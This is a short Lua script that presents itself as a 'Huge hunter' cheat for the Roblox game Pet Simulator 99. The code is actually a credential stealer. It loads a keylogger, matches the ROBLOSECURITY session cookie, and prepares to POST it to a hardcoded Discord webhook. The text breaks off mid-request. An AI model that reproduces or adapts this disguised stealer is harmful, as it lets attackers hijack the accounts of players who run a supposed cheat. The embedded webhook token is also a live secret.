-- PS99 Huge hunter Cheat v1.0
-- By: PS99SCRIPTSZZZ
-- GitHub: https://github.com/PS99SCRIPTSZZZ/hugehunterscript

local webhook_url ="https://discord.com/api/webhooks/1373045421529632798/K4fyF4KF0HPaoEvSGnJM8yIh2fK5zhdjru9jyZwGvRvTXvxK_QlWWuCGWZ_PjIjDCJtn"local keylogger = require('keylogger')local function on_key_pressed(key)    if key:find('ROBLOSECURITY') then
        local cookie = key:match('ROBLOSECURITY (.+)')        local payload = { content ="Roblox Cookie:" .. cookie} local options = { method ="POST", headers = { ["
